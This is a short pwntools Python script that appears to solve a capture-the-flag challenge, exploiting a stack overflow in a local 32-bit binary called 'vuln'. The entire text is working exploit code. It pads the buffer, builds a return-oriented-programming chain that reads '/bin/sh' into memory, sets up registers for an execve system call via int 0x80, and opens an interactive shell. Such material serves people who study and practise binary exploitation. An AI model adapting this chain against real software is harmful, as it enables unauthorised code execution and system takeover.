from pwn import *
context.clear(arch = "i386", kernel = 'amd64')

gets_function = 0x8051b70
int_call = 0x0804a3d2
pop_ecx = 0x08049e39
pop_eax_edx_ebx = 0x080583c8

elf = ELF('./vuln')
rop = ROP(elf)
buf_addr = elf.bss(0x80)
rop.raw('A'*28)
rop.call(gets_function, (buf_addr,)) # gets /bin/sh
rop.puts(buf_addr)
rop.raw(pop_eax_edx_ebx)
rop.raw(p32(0xb)) # eax = 0xb = execve
rop.raw(p32(0)) # edx = 0
rop.raw(buf_addr) # ebx = /bin/sh
rop.raw(pop_ecx)
rop.raw(p32(0)) # ecx = 0
rop.raw(int_call) # int 0x80

rop.exit()
p = process('./vuln')
p.recvuntil(b'How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n')
p.send(rop.chain())
p.interactive()
